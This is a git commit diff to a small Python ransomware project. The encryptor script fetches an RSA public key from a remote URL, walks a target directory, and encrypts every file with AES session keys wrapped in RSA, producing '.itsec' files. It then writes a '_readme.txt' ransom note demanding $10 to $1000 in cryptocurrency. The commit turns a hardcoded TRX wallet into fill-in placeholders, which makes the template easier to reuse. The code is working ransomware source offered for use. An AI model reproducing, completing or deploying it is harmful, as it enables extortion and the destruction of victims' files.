6d5bad90a6a67214d155085a7abc4cd8d00a9d57
shinau21 <bandingandesa@gmail.com>
2023-03-25 09:33:23 +0700

    Get Key From URL

--- itsec-dec.py
+++ itsec-dec.py
@@ -5,7 +5,7 @@ from Crypto.PublicKey import RSA
 from Crypto.Random import get_random_bytes
 from Crypto.Cipher import AES, PKCS1_OAEP
 
-pvk = '''Your RSA Private Key'''
+pvk = '''PRIVATE KEY'''
 
 def defense(target):
     for p, d, f in os.walk(target):
--- itsec-enc.py
+++ itsec-enc.py
@@ -1,4 +1,5 @@
 import os
+import random
 import requests as req
 from time import sleep
 from cryptography.fernet import Fernet as xf
@@ -6,10 +7,15 @@ from Crypto.PublicKey import RSA
 from Crypto.Random import get_random_bytes
 from Crypto.Cipher import AES, PKCS1_OAEP
 
-
-URL_KEY = "Your URL publicKey"
+url_web = "YOUR URL PUBLIC KEY"
+url_list = []
+URL_KEY = url_web + random.choice(url_list)
 pbk = req.get(URL_KEY).text
-lcx = 'license'
+lcx = URL_KEY.split('/')[3].split('.')[0]
+
+WALLET_ADDRESS ='''YOUR WALLET ADDRESS'''
+
+CONTACT = '''CONTACT HERE'''
 
 def attack(target):
 
@@ -22,17 +28,16 @@ def attack(target):
                     with open(p + name, "rb") as mfile:
                         data = mfile.read()
                         newFile = os.path.join(p, name) +  ".itsec"
-                        print(newFile)
                         file_out = open(newFile, "wb")
 
                         recipient_key = RSA.importKey(pbk)
                         session_key = get_random_bytes(16)
 
-                        # Mengenkripsi session key with dengan public RSA key
+                        # Encrypt the session key with the public RSA key
                         cipher_rsa = PKCS1_OAEP.new(recipient_key)
                         enc_session_key = cipher_rsa.encrypt(session_key)
 
-                        # Mengenkripsi data dengan AES session key
+                        # Encrypt the data with the AES session key
                         cipher_aes = AES.new(session_key, AES.MODE_EAX)
                         ciphertext, tag = cipher_aes.encrypt_and_digest(data)
                         [ file_out.write(x) for x in (enc_session_key, cipher_aes.nonce, tag, ciphertext) ]
@@ -50,9 +55,14 @@ def attack(target):
                 and other important are encrypted with strongest encryption and unique key.
                 I want to continue my studies, But need some money,
                 If you want to back your file, you can buy my decrypt tools
-                Price of decrypt tools is $50
-                Send your payment into TRX Wallet : TE4vx8wFoBh8ZPapGWrYynLuKYqk3hN3G9
+                Price of decrypt tools is $10 - $1000 depend on large files''' + '''
+
+                Choice one payment'''
+                + WALLET_ADDRESS + '''
+                
                 Your Personal Key is : ''' + lcx + '''
+
+                ''' + CONTACT + '''
                 Thank You For Your Attention (*v*)'''
                 with open(p + '\\' + '_readme.txt', 'w') as f:
                     f.writelines(lines)
